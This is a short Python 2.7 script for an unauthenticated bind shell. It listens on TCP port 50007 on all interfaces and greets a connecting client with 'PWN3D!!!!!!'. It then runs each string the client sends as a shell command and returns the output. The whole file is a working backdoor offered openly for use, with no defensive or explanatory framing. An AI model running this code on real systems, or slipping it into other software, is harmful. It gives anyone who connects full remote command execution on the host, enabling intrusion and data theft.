"""
simple bind shell written in Python 2.7

set LISTENADDRESS to the ip of the interface you want to listen on use '' for
all available interfaces

set PORT to the TCP port you want to listen on
"""
import socket
import subprocess


LISTENADDRESS = ''
PORT = 50007


def shell_listener(listenaddress, port):
    """
    simple bind shell listener

    Args:
        listenaddress(str): ip address of the interface you want to listen on
        port(int): TCP port to listen on
    """
    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    soc.bind((listenaddress, port))
    soc.listen(1)
    conn, addr = soc.accept()
    conn.send("PWN3D!!!!!!\n")
    while 1:
        conn.send(':')
        data = conn.recv(1024)
        shell = subprocess.Popen(
            data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
            stdin=subprocess.PIPE)
        cmd = shell.stdout.read() + shell.stderr.read()
        conn.send(cmd)
    conn.close()


if __name__ == '__main__':
    shell_listener(LISTENADDRESS, PORT)
